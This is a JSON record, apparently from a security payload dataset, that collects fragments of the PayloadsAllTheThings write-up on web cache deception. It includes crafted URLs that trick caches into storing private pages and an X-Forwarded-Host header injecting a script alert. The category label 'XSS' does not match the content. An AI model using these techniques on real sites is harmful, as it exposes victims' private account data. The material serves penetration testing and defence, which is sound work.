@@ -1,0 +1,27 @@
+{
+  "id": "xss-027b3108b050",
+  "category": "XSS",
+  "title": "README",
+  "description": "# Web Cache Deception\n\n> Web Cache Deception (WCD) is a security vulnerability that occurs when a web server or caching proxy misinterprets a client's request for a web resource and subsequently serves a different resource, which may often be more sensitive or private, after caching it.\n\n## Summary\n\n* [Tools](#tools)\n* [Methodology](#methodology)\n    * [Caching Sensitive Data](#caching-sensitive-data)\n    * [Caching Custom JavaScript](#caching-custom-javascript)\n* [CloudFlare Caching](#cloudflar",
+  "payloads": [
+    "* [PortSwigger/param-miner](https://github.com/PortSwigger/param-miner) - Web Cache Poisoning Burp Extension",
+    "Imagine an attacker lures a logged-in victim into accessing `http://www.example.com/home.php/non-existent.css`",
+    "1. The victim's browser requests the resource `http://www.example.com/home.php/non-existent.css`",
+    "4. The main server returns the content of `http://www.example.com/home.php`, most probably with HTTP caching headers that instruct not to cache this page.",
+    "8. When the attacker requests `http://www.example.com/home.php/non-existent.css`, the request is sent to the cache server, and the cache server returns the cached file with the victim's sensitive `home.php` data.",
+    "1. Normal browsing, visit home : `https://www.example.com/myaccount/home/`",
+    "2. Open the malicious link : `https://www.example.com/myaccount/home/malicious.css`",
+    "4. Open a private tab with the previous URL : `https://www.example.com/myaccount/home/malicious.css`",
+    "[![DEMO](https://i.vimeocdn.com/video/674856618-f9bac811a4c7bcf635c4eff51f68a50e3d5532ca5cade3db784c6d178b94d09a-d)](https://vimeo.com/249130093)",
+    "X-Forwarded-Host: test\"><script>alert(1)</script>",
+    "<meta property=\"og:image\" content=\"https://test\"><script>alert(1)</script>\">",
+    "* `https://example.com/app/conversation/.js?test`",
+    "* `https://example.com/app/conversation/;.js`",
+    "* `https://example.com/home.php/non-existent.css`",
+    "1. Detecting delimiter discrepancies: `/path/<dynamic-resource>;<static-resource>`"
+  ],
+  "references": [
+    "PayloadsAllTheThings/Web Cache Deception/README.md"
+  ],
+  "source": "PayloadsAllTheThings"
+}
